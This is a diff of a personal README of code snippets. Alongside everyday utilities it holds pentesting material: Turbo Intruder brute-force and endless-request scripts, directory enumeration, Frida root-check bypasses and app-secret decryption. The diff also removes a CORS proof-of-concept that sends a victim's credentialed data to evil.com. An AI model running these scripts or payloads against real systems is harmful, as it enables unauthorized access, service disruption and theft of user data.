@@ -1,25 +1,377 @@
-## (Useful) Code Snippets
+# (Useful) Code/Command Snippets
 
-A github repo maintaining mostly (python) code snippets which I use approximately daily and to save time searching for them in local source code/via google. 
+A github repo maintaining mostly (python) code snippets and commands which I use approximately daily and to save time searching for them in local source code/via google. 
 
----
 
-#### Find all the .plists in the local directory and write into one
 
-```bash
-for files in $(find . -name '*.plist'); do
-	echo  >> plists.xml
-	echo $files >> plists.xml
-	echo  >> plists.xml
-	plistutil -i $files  >> plists.xml
-done
+## Code Snippets
+
+### BurpSuite
+
+#### Bruteforce wordlist using Turbo Intruder and write results in file
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=500,
+                           requestsPerConnection=5000,
+                           pipeline=False
+                           )
+
+    for word in open('/home/umar_0x01/url/wordlist4.txt'):
+        engine.queue(target.req, word.rstrip())
+
+
+def handleResponse(req, interesting):
+    with open('/tmp/test.txt', 'a+') as f:
+        if 'set-cookie: session=' not in req.response:
+            if '302' in req.response:
+                table.add(req)
+                f.write(req.response)
 ```
 
----
 
-#### Selenium auto install, parse, and fetch g-recaptcha response from page
 
-```python3
+#### Send same requests indefinitely using Turbo intruder
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=100,
+                           requestsPerConnection=1000,
+                           pipeline=False,
+                           maxRetriesPerRequest=0,
+                           engine=Engine.THREADED
+                           )
+    word = "test"
+    while True:
+        engine.queue(target.req, word.rstrip())
+
+
+def handleResponse(req, interesting):
+    if '500' in req.response:
+        table.add(req)
+```
+
+
+
+#### Burp extensions to exclude
+
+```powershell
+.*\.(gif|jpg|png|css|js|ico|svg|eot|woff|woff2|ttf|ts|mp4|otf|jpeg)
+```
+
+
+
+### Helpful Code Blocks
+
+#### Preventing certificate warning with requests/urllib3 while using proxy
+
+```python
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+```
+
+
+
+#### Getting all IPs in a CIDR range using python
+
+```bash
+for ips in ipaddress.ip_network('192.168.100.0/24'): print(ips)
+```
+
+
+
+#### Execute commands in a file with multiprocessing (like downloading of videos using aria2c)
+
+```python
+# python3 exec.py commands.sh 5
+
+import concurrent.futures
+from sys import argv
+from os import system
+
+PROCESSES   = int(argv[2])
+
+with open(argv[1], 'r') as f:
+    commands = f.read().strip().split("\n")
+
+def execute_command(cmd):
+    print(cmd)
+    system(cmd)
+
+with concurrent.futures.ProcessPoolExecutor(max_workers = PROCESSES) as executor:
+    executor.map(execute_command, commands)
+```
+
+
+
+#### Python Progressbar2 with requests
+
+```bash
+pip install progressbar2
+```
+
+```python
+import progressbar
+import requests
+
+
+progressbar.streams.wrap_stderr()
+
+
+def makeRequest(url, path):
+    response = requests.get(
+        url + path
+    )
+
+    if response.status_code == 200:
+        print(f"[#] {url}{path} -> {response.status_code}")
+
+
+def main():
+    PATHS = ['/admin', '/adm', '/ad', '/admn', '/a', '/amin', '/ain', '/an', '/dmin', '/post', '/in', '/din', '/amin', '/dmin', '/din', '', '/amin', '/dmin', '/din', '/admi']
+
+    URL = 'https://umar0x01.sh'
+
+    print("[$] Starting direnum...\n")
+
+    for pths, i in zip(PATHS, progressbar.progressbar(range(len(PATHS) - 1), redirect_stdout=True)):
+        makeRequest(URL, pths)
+
+
+if __name__ == '__main__':
+    main()
+```
+
+
+### Wordlists Generation
+
+#### Generate wordlist using python3 containing uppercase, lowercase, and digits upto specific characters (custom stop)
+
+```python
+import random
+import string
+
+characters = 5
+
+with open('wordlist.txt', 'a+') as f:
+	while True:
+		f.write( f"{''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=characters))}\n" )
+```
+
+Run it with:
+
+```bash
+python3 gen.py
+cat wordlist.txt | sort | uniq > sort_uniq_wordlist_5chars.txt
+```
+
+
+### Mobile Applications Testing
+
+#### VSCode Java remote process debugging using adb port forward
+
+Port forwarding:
+
+```bash
+adb jdwp
+adb forward tcp:54327 jdwp:3486
+```
+
+VS Code config file:
+
+```json
+{
+    "version": "0.2.0",
+    "configurations": [
+        {
+            "type": "java",
+            "name": "Debug (Attach)",
+            "request": "attach",
+            "hostName": "localhost",
+            "port": 54327
+        }
+    ]
+}
+```
+
+
+
+#### Basic frida code to bypass root check (owasp uncrackable 1-2)
+
+```javascript
+Java.perform(function() {
+    var root_lib = Java.use('sg.vantagepoint.a.b');
+
+    root_lib.a.implementation = function() {
+        return false;
+    }
+
+    root_lib.b.implementation = function() {
+        return false;
+    }
+
+    root_lib.c.implementation = function() {
+        return false;
+    }
+})
+```
+
+
+
+#### Frida code to run an imported method from native library by hooking onCreate and calling it with it's parameters
+
+CC: @makman
+
+```javascript
+Java.perform(function () {
+    var MainActivity = Java.use('com.example.application.MainActivity');
+    MainActivity.onCreate.implementation = function (paramBundle) {
+        console.log("\n[+] Inside onCreate\n");
+        console.log(this.stringFromJNI());
+        this.onCreate(paramBundle);
+    };
+});
+```
+
+
+
+#### PHP code to decode a XOR base64 encoded string while having the key (retrieved from the native method from android application)
+
+CC: @makman
+
+```php
+<?php
+
+$secret = 'XUBBUkRfQ3xyUnt5THxdX28IAQ0CZm8LVnBteXBacwdAFW8LCAYDTA==';
+
+$secret = base64_decode($secret);
+
+$secret_length = strlen($secret);
+
+$key = '842109';
+$key_length = strlen($key);
+
+$flag = [];
+
+for ($i = 0; $i < $secret_length; $i++) {
+    $single = $secret[$i];
+    $flag[] = $key[$i % $key_length] ^ $single;
+}
+
+echo implode('', $flag);
+
+?>
+```
+
+
+
+#### Basic Java code to decrypt AES encrypted base64 encoded string with IV/Key
+
+```java
+import java.io.PrintStream;
+import java.util.Base64;
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+
+class RaceCondition {
+    public static String decrypt(String valueData) {
+        try {
+            IvParameterSpec iv = new IvParameterSpec("fedcba9876543210".getBytes("UTF-8"));
+            SecretKeySpec skeySpec = new SecretKeySpec("0123456789abcdef".getBytes("UTF-8"), "AES");
+            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+            cipher.init(2, skeySpec, iv);
+            byte[] temp = Base64.getDecoder().decode(valueData);
+            return new String(Base64.getDecoder().decode(cipher.doFinal(temp)));
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            return null;
+        }
+    }
+
+    public static void main(String[] args) {
+        System.out.println(decrypt("sqCDT4L+YF5hHNPj9hTgzWuuyXOTFruD8LfbyIs/nlYgeaVZMWZmXeQknnHzAQhKCdREPXfXAX3nSp1HgFJmKw=="));
+    }
+}
+```
+
+
+
+#### Decrypting AES encrypted b64 encoded string when you've to convert IV/SecretKey into bytes
+
+```java
+import java.security.MessageDigest;
+import java.security.spec.AlgorithmParameterSpec;
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+import java.util.Base64;
+import java.nio.charset.StandardCharsets;
+
+class LayerTwo {
+    static byte[] decrypt_text(byte[] ivBytes, byte[] keyBytes, byte[] bytes) throws Exception {
+        AlgorithmParameterSpec ivSpec = new IvParameterSpec(ivBytes);
+        SecretKeySpec newKey = new SecretKeySpec(keyBytes, "AES");
+        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+
+        cipher.init(2, newKey, ivSpec);
+        return cipher.doFinal(bytes);
+    }
+
+    public static byte[] decrypt(String ivStr, String keyStr, String base64_text) throws Exception {
+        byte[] base64_text_decoded = Base64.getDecoder().decode(base64_text);
+        MessageDigest md = MessageDigest.getInstance("MD5");
+        md.update(ivStr.getBytes());
+
+        byte[] ivBytes = md.digest();
+        MessageDigest sha = MessageDigest.getInstance("SHA-256");
+        sha.update(keyStr.getBytes());
+        return decrypt_text(ivBytes, sha.digest(), base64_text_decoded);
+    }
+
+    public static void main(String[] args) {
+        try {
+            // Ip address
+            // "admin_name":"Sm0e+2JxJqOeXWQo0ZdZiQ==","admin_pass":"w9SEXEWvemvKS3PdVvfKBQ=="
+            String ip_address = "9I3aP8MS/VKnzPKbx7swGxaMfaoGF0GEbSq64KZFsyg=";
+            byte[] decrypted_text = decrypt("Lahore", "WelcomeToLahore", ip_address);
+            String decryted_text_into_string = new String(decrypted_text, StandardCharsets.UTF_8);
+            System.out.println(decryted_text_into_string);
+        }
+
+        catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+
+
+#### Frida snippet to intercept remove syscall from native library of android and return 000 (so file doesn't get deleted)
+
+CC: @makman
+
+```javascript
+Interceptor.attach(Module.getExportByName('libnative-lib.so', 'remove'), {
+    onEnter: function (args) {
+        args[0] = ptr('000');
+    },
+    onLeave: function (retval) {
+        console.log("++++++++++++++++++++++");
+    }
+});
+```
+
+
+
+### Generic Automation
+
+#### Selenium auto open, parse, fetch g-recaptcha response from the page for further login
+
+```python
 from selenium import webdriver
 from webdriver_manager.chrome import ChromeDriverManager
 from selenium.webdriver.chrome.options import Options
@@ -49,11 +401,11 @@ captcha_text = driver.find_element(By.ID, "g-recaptcha-response")
 print(captcha_text.get_attribute('value'))
 ```
 
----
+
 
 #### Convert .HEIC to .jpg using python and linux
 
-```python3
+```python
 import os 
 
 for files in os.listdir():
@@ -63,83 +415,11 @@ for files in os.listdir():
 		os.system(command)
 ```
 
----
 
-#### Bruteforce wordlist using Turbo Intruder and write results in file
-```python3
-def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint,
-                           concurrentConnections=500,
-                           requestsPerConnection=5000,
-                           pipeline=False
-                           )
-
-    for word in open('/home/umar_0x01/url/wordlist4.txt'):
-        engine.queue(target.req, word.rstrip())
-
-
-def handleResponse(req, interesting):
-    with open('/tmp/test.txt', 'a+') as f:
-        if 'set-cookie: session=' not in req.response:
-            if '302' in req.response:
-                table.add(req)
-                f.write(req.response)
-```
-
-#### Send same requests indefinitely using Turbo intruder
-```python3
-def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint,
-                           concurrentConnections=100,
-                           requestsPerConnection=1000,
-                           pipeline=False,
-                           maxRetriesPerRequest=0,
-                           engine=Engine.THREADED
-                           )
-    word = "test"
-    while True:
-        engine.queue(target.req, word.rstrip())
-
-
-def handleResponse(req, interesting):
-    if '500' in req.response:
-        table.add(req)
-```
-
----
-
-#### Creating S3 presigned url with 1 hour expiration time
-
-```python3
-import boto3
-import botocore
-
-
-def s3ClientCall():
-    return boto3.client('s3')
-
-
-clientCall      = s3ClientCall()
-
-bucketName = 'test-bucket'
-objectName = 'secret.txt'
-
-presignedURL    = clientCall.generate_presigned_url('get_object',
-    Params      = {
-        'Bucket': bucketName,
-        'Key': objectName
-    },
-		ExpiresIn   = 3600
-)
-
-print(presignedURL)
-```
-
----
 
 #### Usage of multiprocessing in Python3
 
-```python3
+```python
 """
 Usage of multiprocessing within python3
 
@@ -165,11 +445,11 @@ with concurrent.futures.ProcessPoolExecutor(max_workers = PROCESSES) as executor
     executor.map(goToSleep, [2] * 50)
 ```
 
----
+
 
 #### Return week day today from the start of the year
 
-```python3
+```python
 """
 Return week day today from the start of the year
 Right now it's: 35
@@ -182,11 +462,11 @@ def returnWeekNumber():
     return(str(weekNumber))
 ```
 
----
+
 
 #### Return list[] of dates from today to past days (e.g: 7 days from now to past) 
 
-```python3
+```python
 """
 Return list[] of dates from today to past days, such as 7 days from now to past:
 ['25-08-2020', '24-08-2020', '23-08-2020', '22-08-2020', '21-08-2020', '20-08-2020', '19-08-2020']
@@ -203,42 +483,11 @@ def returnDates():
     return(date_list)
 ```
 
----
 
-#### Reading file from a S3 bucket using access keys directly through variables (I know it's unsecure :P)
-
-```python3
-"""
-Reading file from a S3 bucket using access keys directly through 
-variables (I know it's unsecure :P)
-
-Takes region of the bucket, the bucket, file to read, access key and secret access key
-"""
-
-import boto3
-
-def readFileFromS3(region, bucket, file, ACCESS_KEY, SECRET_KEY):
-    s3 = boto3.resource('s3',
-        region_name             = region,
-        aws_access_key_id       = ACCESS_KEY,
-        aws_secret_access_key   = SECRET_KEY,
-    )
-
-    bucket = s3.Object(bucket, file)
-    body = bucket.get()['Body'].read().decode()
-
-    return(body)
-
-sourceCode  = readFileFromS3(region='eu-west-1', bucket='test-bucket', file='test.json', 
-                                ACCESS_KEY='', SECRET_KEY='')
-print(sourceCode)
-```
-
----
 
 #### Parsing XLSX file and returning columns in `list(tuple(N, Z))` format
 
-```python3
+```python
 """
 Parses XLSX file using xlrd module (to be installed through pypi)
 Returns `column 0` and `column 2` from the XLSX sheet in the 
@@ -269,11 +518,183 @@ for _tuples in dateAndTypes:
     print(_tuples)
 ```
 
----
+
+
+#### Matching a element in two JSON files and printing out latter's objects based on match
+
+```python
+import json
+
+with open("new.json", "r", encoding="utf-8") as f:
+    new_json = json.loads(f.read().strip())
+
+with open("old.json", "r", encoding="utf-8") as f:
+    old_json = json.loads(f.read().strip())
+
+course_names = []
+to_write = []
+
+for elem in new_json:
+    course_names.append(elem["name"])
+
+for elements in old_json:
+    old_names = elements["name"]
+
+    for names in course_names:
+        if names == old_names:
+            to_write.append(elements)
+
+print(json.dumps(to_write, indent=4))
+```
+
+
+
+#### Creating commands for downloading torrent files, one at a time with aria2c, upload on gdrive, **remove some stuff**
+Created for myself, read the code before using it!
+
+```python
+from sys import argv
+import os
+
+gDdriveID   = argv[1]
+bucket      = argv[2]
+
+def returnIdAndName(torrentFile, grep):
+    command         = f"aria2c --show-files {torrentFile}"
+    results         = os.popen(command).read().strip().split("\n")
+
+    res             = []
+
+    for data in results:
+        if grep in data:
+            res.append(data)
+
+    for stuff in res:
+        count, fileNames = stuff.strip().split("|")
+        command     = f"set -x && aria2c --seed-time=0 --max-upload-limit=1K --seed-ratio=0.0 --select-file {count} {argv[1]} && gupload -r {gDdriveID} \"{fileNames}\" && rm -rfv *"
+        # command   = f"set -x && aria2c --file-allocation=none --seed-time=0 --max-upload-limit=1K --seed-ratio=0.0 --select-file {count} {argv[1]} && aws s3 cp \"{fileNames}\" \"s3://{bucket}/\" --endpoint-url=https://s3.wasabisys.com --no-sign-request && rm -rfv *"
+        print(command)
+
+def main():
+    torrentFile     = argv[1]
+    grep            = ".mkv"
+
+    returnIdAndName(torrentFile, grep)
+
+if __name__ == '__main__':
+    main()
+```
+
+
+
+#### Downloading PDFs (lectures) from VU
+
+```python
+import requests
+import os
+
+for lesson in range(1, 22 + 1):
+    url     = f'https://vulms.vu.edu.pk/Courses/PHY101/Lessons/Lesson_{lesson}/Lecture{str(lesson).zfill(2)}.pdf'
+    print(url)
+
+    command = f'aria2c -s 10 -j 10 -x 16 -c --file-allocation=none "{url}"'
+    os.system(command)
+```
+
+
+
+#### Youtube playlist reverse download -- python3
+
+Use with https://github.com/yt-dlp/yt-dlp for best downloading
+
+```python
+import os
+
+playlist    = "https://www.youtube.com/c/.../videos"
+command     = f"youtube-dl -j --flat-playlist --playlist-reverse {playlist} | jq -r '.id' | sed 's_^_https://youtu.be/_'"
+print(command)
+print()
+
+output      = os.popen(command).read()
+print(output)
+
+ytUrls      = []
+
+for count, urls in zip(range(1, 100000), output.strip().split("\n")):
+    count   = str(count).zfill(3)
+    cmd     = f'youtube-dl -f mp4 -i -v -R 3 --fragment-retries 3 -c -o "{count} - %(title)s.%(ext)s" {urls} --external-downloader "aria2c" --external-downloader-args "-j 10 -s 10 -x 16 --file-allocation=none -c"'
+    print(cmd)
+```
+
+
+
+### Cloud
+
+#### Creating S3 presigned url with 1 hour expiration time
+
+```python
+import boto3
+import botocore
+
+
+def s3ClientCall():
+    return boto3.client('s3')
+
+
+clientCall      = s3ClientCall()
+
+bucketName = 'test-bucket'
+objectName = 'secret.txt'
+
+presignedURL    = clientCall.generate_presigned_url('get_object',
+    Params      = {
+        'Bucket': bucketName,
+        'Key': objectName
+    },
+		ExpiresIn   = 3600
+)
+
+print(presignedURL)
+```
+
+
+
+#### Reading file from a S3 bucket using access keys directly through variables (I know it's unsecure :P)
+
+```python
+"""
+Reading file from a S3 bucket using access keys directly through 
+variables (I know it's unsecure :P)
+
+Takes region of the bucket, the bucket, file to read, access key and secret access key
+"""
+
+import boto3
+
+def readFileFromS3(region, bucket, file, ACCESS_KEY, SECRET_KEY):
+    s3 = boto3.resource('s3',
+        region_name             = region,
+        aws_access_key_id       = ACCESS_KEY,
+        aws_secret_access_key   = SECRET_KEY,
+    )
+
+    bucket = s3.Object(bucket, file)
+    body = bucket.get()['Body'].read().decode()
+
+    return(body)
+
+sourceCode  = readFileFromS3(region='eu-west-1', bucket='test-bucket', file='test.json', 
+                                ACCESS_KEY='', SECRET_KEY='')
+print(sourceCode)
+```
+
+
+
+### Webhooks
 
 #### Simple function to write a preformatted Slack JSON to a Webhook
 
-```python3
+```python
 """
 Simple function to write a preformatted Slack JSON to a Webhook
 Takes the webhook URL and preformatted JSON as input
@@ -301,11 +722,11 @@ slackPost   = {
 postSlackPost(webhook, slackPost)
 ```
 
----
+
 
 #### Uploading of (text) files in Discord channel through webhooks
 
-```python3
+```python
 """
 Python3 snippet allowing uploading of (text) files in discord server's
 channel through webhook
@@ -340,36 +761,7 @@ if __name__ == '__main__':
 	main()
 ```
 
----
 
-#### Matching a element in two JSON files and printing out latter's objects based on match
-
-```python
-import json
-
-with open("new.json", "r", encoding="utf-8") as f:
-    new_json = json.loads(f.read().strip())
-
-with open("old.json", "r", encoding="utf-8") as f:
-    old_json = json.loads(f.read().strip())
-
-course_names = []
-to_write = []
-
-for elem in new_json:
-    course_names.append(elem["name"])
-
-for elements in old_json:
-    old_names = elements["name"]
-
-    for names in course_names:
-        if names == old_names:
-            to_write.append(elements)
-
-print(json.dumps(to_write, indent=4))
-```
-
----
 
 #### Uploading files to Slack `channels` through `Bot` using `cURL` with `OAuth Access Token`
 
@@ -388,54 +780,38 @@ curl -v -i -s -k -X $'POST' \
   $'https://slack.com/api/files.upload?token=xoxp-xxx-xxx-xxx-xxxx&channels=myFiles&pretty=1'
 ```
 
----
 
-#### Creating commands for downloading torrent files, one at a time with aria2c, upload on gdrive, **remove some stuff**
-Created for myself, read the code before using it!
 
-```python3
-from sys import argv
-import os
 
-gDdriveID   = argv[2]
-bucket      = argv[2]
 
-def returnIdAndName(torrentFile, grep):
-    command         = f"aria2c --show-files {torrentFile}"
-    results         = os.popen(command).read().strip().split("\n")
 
-    res             = []
 
-    for data in results:
-        if grep in data:
-            res.append(data)
 
-    for stuff in res:
-        count, fileNames = stuff.strip().split("|")
-        command     = f"set -x && aria2c --seed-time=0 --max-upload-limit=1K --seed-ratio=0.0 --select-file {count} {argv[1]} && gupload -r {gDdriveID} \"{fileNames}\" && rm -rfv *"
-        # command   = f"set -x && aria2c --file-allocation=none --seed-time=0 --max-upload-limit=1K --seed-ratio=0.0 --select-file {count} {argv[1]} && aws s3 cp \"{fileNames}\" \"s3://{bucket}/\" --endpoint-url=https://s3.wasabisys.com --no-sign-request && rm -rfv *"
-        print(command)
 
-def main():
-    torrentFile     = argv[1]
-    grep            = ".mkv"
 
-    returnIdAndName(torrentFile, grep)
 
-if __name__ == '__main__':
-    main()
+
+
+
+
+## Command Snippets
+
+### iOS
+
+#### Find all the .plists in the local directory and write into one
+
+```bash
+for files in $(find . -name '*.plist'); do
+	echo  >> plists.xml
+	echo $files >> plists.xml
+	echo  >> plists.xml
+	plistutil -i $files  >> plists.xml
+done
 ```
 
----
 
-#### Preventing certificate warning with requests/urllib3 while using proxy
 
-```python3
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-```
-
----
+### Linux
 
 #### Installing docker (and adding user in docker group)
 
@@ -449,27 +825,20 @@ sudo apt-get -y update && \
     sudo usermod -aG docker $USER
 ```
 
----
 
-#### Downloading PDFs (lectures) from Virtual University
 
-```python3
-import requests
-import os
+#### Generate wordlist using crunch containing uppercase, lowercase, and digits of upto 4-5 placeholders (5.2 GB)
 
-for lesson in range(1, 22 + 1):
-    url     = f'https://vulms.vu.edu.pk/Courses/PHY101/Lessons/Lesson_{lesson}/Lecture{str(lesson).zfill(2)}.pdf'
-    print(url)
-
-    command = f'aria2c -s 10 -j 10 -x 16 -c --file-allocation=none "{url}"'
-    os.system(command)
+```bash
+crunch 4 5 -f /usr/share/crunch/charset.lst mixalpha-numeric -o charlist.txt
 ```
 
----
 
+
+### Cloud
 #### Getting STS tokens with export= for CLI - Add in $PATH
 
-```python3
+```python
 #!/usr/bin/python3
 
 
@@ -549,10 +918,9 @@ def main():
 
 if __name__ == '__main__':
     main()
-
 ```
 
----
+
 
 #### Creating layer for AWS Lambda function
 
@@ -564,381 +932,9 @@ mkdir -p python && \
 	zip -rv python.zip python/
 ```
 
----
 
-#### Cleaning WSL2 storage after deletion of files (Home edition)
 
-```powershell
-wsl --shutdown
-diskpart
-
-select vdisk file="C:\Users\Syed Umar Arfeen\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu20.04onWindows_79rhkp1fndgsc\LocalState\ext4.vhdx"
-attach vdisk readonly
-
-compact vdisk
-detach vdisk
-exit
-```
-
----
-
-#### Python Progressbar2 with requests
-
-```bash
-pip install progressbar2
-```
-
-```python3
-import progressbar
-import requests
-
-
-progressbar.streams.wrap_stderr()
-
-
-def makeRequest(url, path):
-    response = requests.get(
-        url + path
-    )
-
-    if response.status_code == 200:
-        print(f"[#] {url}{path} -> {response.status_code}")
-
-
-def main():
-    PATHS = ['/admin', '/adm', '/ad', '/admn', '/a', '/amin', '/ain', '/an', '/dmin', '/post', '/in', '/din', '/amin', '/dmin', '/din', '', '/amin', '/dmin', '/din', '/admi']
-
-    URL = 'https://umar0x01.sh'
-
-    print("[$] Starting direnum...\n")
-
-    for pths, i in zip(PATHS, progressbar.progressbar(range(len(PATHS) - 1), redirect_stdout=True)):
-        makeRequest(URL, pths)
-
-
-if __name__ == '__main__':
-    main()
-```
-
----
-
-#### Getting all IPs in a CIDR range using python
-
-```bash
-for ips in ipaddress.ip_network('192.168.100.0/24'): print(ips)
-```
-
----
-
-#### Youtube playlist reverse -- python3
-
-```python3
-import os
-
-playlist    = "https://www.youtube.com/c/.../videos"
-command     = f"youtube-dl -j --flat-playlist --playlist-reverse {playlist} | jq -r '.id' | sed 's_^_https://youtu.be/_'"
-print(command)
-print()
-
-output      = os.popen(command).read()
-print(output)
-
-ytUrls      = []
-
-for count, urls in zip(range(1, 100000), output.strip().split("\n")):
-    count   = str(count).zfill(3)
-    cmd     = f'youtube-dl -f mp4 -i -v -R 3 --fragment-retries 3 -c -o "{count} - %(title)s.%(ext)s" {urls} --external-downloader "aria2c" --external-downloader-args "-j 10 -s 10 -x 16 --file-allocation=none -c"'
-    print(cmd)
-```
-
----
-
-#### VSCode Java remote process debugging using adb port forward
-
-Port forwarding:
-```bash
-adb jdwp
-adb forward tcp:54327 jdwp:3486
-```
-
-VS Code config file:
-```json
-{
-    "version": "0.2.0",
-    "configurations": [
-        {
-            "type": "java",
-            "name": "Debug (Attach)",
-            "request": "attach",
-            "hostName": "localhost",
-            "port": 54327
-        }
-    ]
-}
-```
-
----
-
-#### Basic frida code to bypass root check (owasp uncrackable 1-2)
-
-```javascript
-Java.perform(function() {
-    var root_lib = Java.use('sg.vantagepoint.a.b');
-
-    root_lib.a.implementation = function() {
-        return false;
-    }
-
-    root_lib.b.implementation = function() {
-        return false;
-    }
-
-    root_lib.c.implementation = function() {
-        return false;
-    }
-})
-```
-
----
-
-#### Frida code to run an imported method from native library by hooking onCreate and calling it with it's parameters -- CC: @makman
-
-```javascript
-Java.perform(function () {
-    var MainActivity = Java.use('com.example.application.MainActivity');
-    MainActivity.onCreate.implementation = function (paramBundle) {
-        console.log("\n[+] Inside onCreate\n");
-        console.log(this.stringFromJNI());
-        this.onCreate(paramBundle);
-    };
-});
-```
-
----
-
-#### PHP code to decode a XOR base64 encoded string while having the key (retrieved from the native method from android application) -- CC: @makman
-
-```php
-<?php
-
-$secret = 'XUBBUkRfQ3xyUnt5THxdX28IAQ0CZm8LVnBteXBacwdAFW8LCAYDTA==';
-
-$secret = base64_decode($secret);
-
-$secret_length = strlen($secret);
-
-$key = '842109';
-$key_length = strlen($key);
-
-$flag = [];
-
-for ($i = 0; $i < $secret_length; $i++) {
-    $single = $secret[$i];
-    $flag[] = $key[$i % $key_length] ^ $single;
-}
-
-echo implode('', $flag);
-
-?>
-```
-
----
-
-#### Basic Java code to decrypt AES encrypted base64 encoded string with IV/Key
-
-```java
-import java.io.PrintStream;
-import java.util.Base64;
-import javax.crypto.Cipher;
-import javax.crypto.spec.IvParameterSpec;
-import javax.crypto.spec.SecretKeySpec;
-
-class RaceCondition {
-    public static String decrypt(String valueData) {
-        try {
-            IvParameterSpec iv = new IvParameterSpec("fedcba9876543210".getBytes("UTF-8"));
-            SecretKeySpec skeySpec = new SecretKeySpec("0123456789abcdef".getBytes("UTF-8"), "AES");
-            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
-            cipher.init(2, skeySpec, iv);
-            byte[] temp = Base64.getDecoder().decode(valueData);
-            return new String(Base64.getDecoder().decode(cipher.doFinal(temp)));
-        } catch (Exception ex) {
-            ex.printStackTrace();
-            return null;
-        }
-    }
-
-    public static void main(String[] args) {
-        System.out.println(decrypt("sqCDT4L+YF5hHNPj9hTgzWuuyXOTFruD8LfbyIs/nlYgeaVZMWZmXeQknnHzAQhKCdREPXfXAX3nSp1HgFJmKw=="));
-    }
-}
-```
-
----
-
-#### Decrypting AES encrypted b64 encoded string when you've to convert IV/SecretKey into bytes
-
-```java
-import java.security.MessageDigest;
-import java.security.spec.AlgorithmParameterSpec;
-import javax.crypto.Cipher;
-import javax.crypto.spec.IvParameterSpec;
-import javax.crypto.spec.SecretKeySpec;
-import java.util.Base64;
-import java.nio.charset.StandardCharsets;
-
-class LayerTwo {
-    static byte[] decrypt_text(byte[] ivBytes, byte[] keyBytes, byte[] bytes) throws Exception {
-        AlgorithmParameterSpec ivSpec = new IvParameterSpec(ivBytes);
-        SecretKeySpec newKey = new SecretKeySpec(keyBytes, "AES");
-        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
-
-        cipher.init(2, newKey, ivSpec);
-        return cipher.doFinal(bytes);
-    }
-
-    public static byte[] decrypt(String ivStr, String keyStr, String base64_text) throws Exception {
-        byte[] base64_text_decoded = Base64.getDecoder().decode(base64_text);
-        MessageDigest md = MessageDigest.getInstance("MD5");
-        md.update(ivStr.getBytes());
-
-        byte[] ivBytes = md.digest();
-        MessageDigest sha = MessageDigest.getInstance("SHA-256");
-        sha.update(keyStr.getBytes());
-        return decrypt_text(ivBytes, sha.digest(), base64_text_decoded);
-    }
-
-    public static void main(String[] args) {
-        try {
-            // Ip address
-            // "admin_name":"Sm0e+2JxJqOeXWQo0ZdZiQ==","admin_pass":"w9SEXEWvemvKS3PdVvfKBQ=="
-            String ip_address = "9I3aP8MS/VKnzPKbx7swGxaMfaoGF0GEbSq64KZFsyg=";
-            byte[] decrypted_text = decrypt("Lahore", "WelcomeToLahore", ip_address);
-            String decryted_text_into_string = new String(decrypted_text, StandardCharsets.UTF_8);
-            System.out.println(decryted_text_into_string);
-        }
-
-        catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-}
-```
-
----
-
-#### Frida snippet to intercept remove syscall from native library of android and return 000 (so file doesn't get deleted) -- CC: @makman
-
-```javascript
-Interceptor.attach(Module.getExportByName('libnative-lib.so', 'remove'), {
-    onEnter: function (args) {
-        args[0] = ptr('000');
-    },
-    onLeave: function (retval) {
-        console.log("++++++++++++++++++++++");
-    }
-});
-```
-
----
-
-#### Execute commands in a file with multiprocessing (like downloading of videos using aria2c)
-
-```python3
-# python3 exec.py commands.sh 5
-
-import concurrent.futures
-from sys import argv
-from os import system
-
-PROCESSES   = int(argv[2])
-
-with open(argv[1], 'r') as f:
-    commands = f.read().strip().split("\n")
-
-def execute_command(cmd):
-    print(cmd)
-    system(cmd)
-
-with concurrent.futures.ProcessPoolExecutor(max_workers = PROCESSES) as executor:
-    executor.map(execute_command, commands)
-```
-
----
-
-#### Generate wordlist using crunch containing uppercase, lowercase, and digits of upto 4-5 placeholders (5.2 GB)
-
-```bash
-crunch 4 5 -f /usr/share/crunch/charset.lst mixalpha-numeric -o charlist.txt
-```
-
----
-
-#### Generate wordlist using python3 containing uppercase, lowercase, and digits upto specific characters (custom stop)
-```python3
-import random
-import string
-
-characters = 5
-
-with open('wordlist.txt', 'a+') as f:
-	while True:
-		f.write( f"{''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=characters))}\n" )
-```
-
-Run it with:
-```bash
-python3 gen.py
-cat wordlist.txt | sort | uniq > sort_uniq_wordlist_5chars.txt
-```
-
----
-
-#### POC for C0RS
-
-```html
-<!DOCTYPE html>
-<html>
-<body>
-<center>
-<h3>Steal customer data!</h3>
-<html>
-<body>
-<button type='button' onclick='cors()'>Exploit</button>
-<p id='demo'></p>
-<script>
-function cors() {
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-if (this.readyState == 4 && this.status == 200) {
-var a = this.responseText; // Sensitive data from subdomain.site.com about user account
-document.getElementById("demo").innerHTML = a;
-xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
-xhttp.withCredentials = true;
-console.log(a);
-xhttp.send("data=" a);
-}
-};
-xhttp.open("GET", "https://subdomain.site.com/data-endpoint", true);
-xhttp.withCredentials = true;
-xhttp.send();
-}
-</script>
-</body>
-</html>
-```
-
----
-
-### Burp extensions to exclude
-
-```powershell
-.*\.(gif|jpg|png|css|js|ico|svg|eot|woff|woff2|ttf|ts|mp4|otf|jpeg)
-```
-
----
-
-### Instance setup
+#### EC2 Instance setup
 
